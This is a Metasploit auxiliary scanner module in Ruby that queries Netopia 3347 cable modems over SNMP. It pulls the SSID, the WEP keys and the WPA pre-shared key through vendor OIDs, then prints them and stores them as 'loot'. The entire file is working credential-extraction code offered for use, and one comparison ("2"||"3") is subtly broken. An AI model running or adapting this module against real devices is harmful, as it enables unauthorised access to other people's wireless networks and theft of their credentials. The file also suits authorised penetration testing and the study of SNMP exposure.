#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Netopia 3347 Cable Modem Wifi Enumeration',
      'Description' => "This module will extract wep keys and WPA preshared keys",
    )

  end

  def run_host(ip)
      output_data = {}
    begin
      snmp = connect_snmp

      if snmp.get_value('sysDescr.0') =~ /Netopia 3347/

      wifistatus = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.1.0')
        if wifistatus == "1"
        wifiinfo = ""
        ssid = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.2.1')
        print_good("#{ip}")
        print_good("SSID: #{ssid}")
        wifiinfo << "SSID: #{ssid}" << "\n"

          wifiversion = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.4.1')
            if wifiversion == "1"

            #Wep enabled
            elsif wifiversion == ("2"||"3")
              wepkey1 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.1')
              print_good("WEP KEY1: #{wepkey1}")
              wifiinfo << "WEP KEY1: #{wepkey1}" << "\n"
              wepkey2 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.2')
              print_good("WEP KEY2: #{wepkey2}")
              wifiinfo << "WEP KEY2: #{wepkey2}" << "\n"
              wepkey3 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.3')
              print_good("WEP KEY3: #{wepkey3}")
              wifiinfo << "WEP KEY3: #{wepkey3}" << "\n"
              wepkey4 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.4')
              print_good("WEP KEY4: #{wepkey4}")
              wifiinfo << "WEP KEY4: #{wepkey4}" << "\n"
              actkey = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.13.0')
              print_good("Active Wep key is Key#{actkey}")
              wifiinfo << "Active WEP key is KEY#: #{actkey}" << "\n"

            #WPA enabled
            elsif wifiversion == "4"
              print_line("Device is configured for WPA ")
              wpapsk = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.5.1')
              print_good("WPA PSK: #{wpapsk}")
              wifiinfo << "WPA PSK: #{wpapsk}" << "\n"

            #WPA Enterprise enabled
            elsif wifiversion == "5"
              print_line("Device is configured for WPA enterprise")
              else
              print_line("FAILED")
            end

      else
         print_line("WIFI is not enabled")
      end
    end
     #Woot we got loot.
     loot_name     = "netopia_wifi"
     loot_type     = "text/plain"
     loot_filename = "netopia_wifi.text"
     loot_desc     = "Netopia Wifi configuration data"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo , loot_filename, loot_desc)
     print_status("WIFI Data saved in: #{p.to_s}")

     rescue ::SNMP::UnsupportedVersion
     rescue ::SNMP::RequestTimeout
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
       print_error("#{ip} error: #{e.class} #{e}")
     disconnect_snmp
     end
  end
end